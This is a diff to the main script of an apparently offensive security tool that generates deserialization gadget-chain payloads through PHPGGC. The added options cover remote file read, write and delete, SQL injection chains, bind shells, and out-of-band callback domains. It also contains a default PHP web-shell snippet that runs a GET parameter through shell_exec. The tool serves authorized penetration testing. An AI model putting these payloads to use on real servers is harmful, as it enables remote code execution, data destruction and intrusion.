@@ -3,6 +3,7 @@
 import argparse
 import sys
 import logging
+import os
 from serialiazers import *
 
 class ColorFormatter(logging.Formatter):
@@ -38,10 +39,8 @@ def setupLogging(no_color, verbose):
     logger.addHandler(handler)
     if verbose:
         logger.setLevel(logging.DEBUG)
-    elif args.out:
-        logger.setLevel(logging.INFO)
     else:
-        logger.setLevel(logging.ERROR)
+        logger.setLevel(logging.INFO)
 
 def createGenerator(serializer, args):
     if serializer == 'phpggc':
@@ -70,28 +69,34 @@ if __name__ == '__main__':
     parser.add_argument('chains', help="Specific gadget chain to generate", nargs='*') 
 
     common_group = parser.add_argument_group('general options')
-    common_group.add_argument('-o', '--out', help="Output payloads to file", default="blackserial-payloads.txt")
+    common_group.add_argument('-o', '--output', help="Output payloads to file", default="payloads.txt")
     common_group.add_argument('-l', '--list', help="List payloads only", action="store_true")
     common_group.add_argument('-s', '--serializer', help="Gadget chain serializer", choices=available_serializers + ['all'], default='phpggc')
+    common_group.add_argument('-f', '--unsafe', help="Unsafe gadget chains like File Delete", action="store_true")    
     common_group.add_argument('-n', '--no-color', help='No colored output', action="store_true")
     common_group.add_argument('-v', '--verbose', help="Verbose mode", action="store_true")    
+    common_group.add_argument('-o1', '--one-file-per-payload', help="Create one file per payload. Base directory of --output will be taken for that", action="store_true") 
 
     payload_group = parser.add_argument_group('payload')
-    payload_group.add_argument('-c', '--system-command', help="System command executed for all chains, %%domain%% is replaced by --interact-domain parameter", default=default_system_command)
-    payload_group.add_argument('-rf', '--remote-file', help="File path written locally on remote server for 'File Write' type chains, where %%ext%% is php, jsp, py depending on the gadget chain", default='./blackserial.%%ext%%')
+    payload_group.add_argument('-c', '--system-command', help="System command executed for all chains, %%domain%% is replaced by --interact-domain parameter and %%chain_id%% by the chain identifier", default=default_system_command)
+    payload_group.add_argument('-i', '--interact-domain', help="Domain for listening to outband DNS, HTTP callbacks: collaborator, interactsh...")
     payload_group.add_argument('-rc', '--remote-content', help="Remote content to write in 'File Write' type chains, defaults to jsp-code, php-code, python-code values")
     payload_group.add_argument('-rp', '--remote-port', help="Remote port that will be opened on remote server for bind shell chains", default='54321')
-    payload_group.add_argument('-i', '--interact-domain', help="Domain for listening to outband DNS, HTTP callbacks: collaborator, interactsh...")
+    payload_group.add_argument('-rr', '--remote-file-to-read', help="File path locally read on remote server for 'File Read' type chains.", default='index.php')
+    payload_group.add_argument('-rw', '--remote-file-to-write', help="File path written locally on remote server for 'File Write' type chains, where %%ext%% is php, jsp, py depending on the gadget chain", default='./blackserial.%%ext%%')
+    payload_group.add_argument('-rd', '--remote-file-to-delete', help="File path locally on remote server that will be delete if unsafe is enabled for 'File Delete' type chains.", default='index.php')
+    payload_group.add_argument('-sq', '--sql', help="SQL query to trigger in 'SQL Injection' chains", default='SELECT SLEEP(15)')
 
     # output encoding
     encoding_group = parser.add_argument_group('encoding')
     encoding_group.add_argument('-u', '--url', help="URL encodes the payload", action="store_true")
     encoding_group.add_argument('-b', '--base64', help="Base64 encode the payload", action="store_true")
+    encoding_group.add_argument('-bu', '--base64-urlsafe', help="Base64 URL safe encode the payload", action="store_true")
 
     # php specific
     phpggc_group = parser.add_argument_group('phpggc')
     phpggc_group.add_argument('--phpggc-path', help="Full path to PHPGGC bin", default="./phpggc/phpggc")
-    phpggc_group.add_argument('--php-functions', help="PHP Functions comma-separated list, used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
+    phpggc_group.add_argument('--php-function', help="PHP Function used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
     phpggc_group.add_argument('--php-code', help="PHP Code or path to a file used for 'RCE: PHP Code' and 'File Write' chains (ex: exploit.php)", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
     phpggc_group.add_argument('--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
 
@@ -134,11 +139,8 @@ if __name__ == '__main__':
     if str(args.interact_domain) == '':
         logging.warning("No interact domain provided, strongly recommanded for out of band detection")
         logging.warning(f"Use --interact-domain <mydomain> option")
-            
-    # manage output
-    if not args.list:
-        f = open(args.out, 'wb') if args.out and args.out != '-' else sys.stdout.buffer
 
+    count = 0
     serializers = available_serializers if args.serializer == 'all' else [args.serializer]
     for serializer in serializers:
 
@@ -166,31 +168,35 @@ if __name__ == '__main__':
                 print(chain['description'])
             continue
         
-        if args.chains:
-            finalChains = []
-            for paramChain in args.chains:
-                found = False
-                for chain in chains:
-                    if chain['name'] == paramChain:
-                        finalChains.append(chain)
-                        found = True
-                        break
-                if not found:
-                    logging.error(f'Cannot find gadget chain named "{paramChain}" among {len(chains)} loaded chains!')
-                    sys.exit(-1)
         else:
-            finalChains = chains
 
-        # generate payloads for each language
-        count = generator.generate(finalChains, f)
+            # delete existing payload file
+            if args.output and args.output != '-' and os.path.exists(args.output) and os.path.isfile(args.output):
+                logging.info(f"Removing existing payload file {args.output}")
+                os.remove(args.output)
 
-        logging.info(f"Generated {count} payloads to {args.out}")
+            if args.chains:
+                finalChains = []
+                for paramChain in args.chains:
+                    found = False
+                    for chain in chains:
+                        if chain['name'] == paramChain:
+                            finalChains.append(chain)
+                            found = True
+                            break
+                    if not found:
+                        logging.error(f'Cannot find gadget chain named "{paramChain}" among {len(chains)} loaded chains!')
+                        sys.exit(-1)
+            else:
+                finalChains = chains
 
-    # cleanup
-    if not args.list and f is not sys.stdout:
-        f.close()
+            # generate payloads for each language
+            count = count + generator.generate(finalChains)
 
-    logging.info(f"Happy hunting!")
+    if not args.list:
+        logging.info(f"Generated {count} payloads to {args.output}")
+
+        logging.info(f"Happy hunting!")
 
 
 
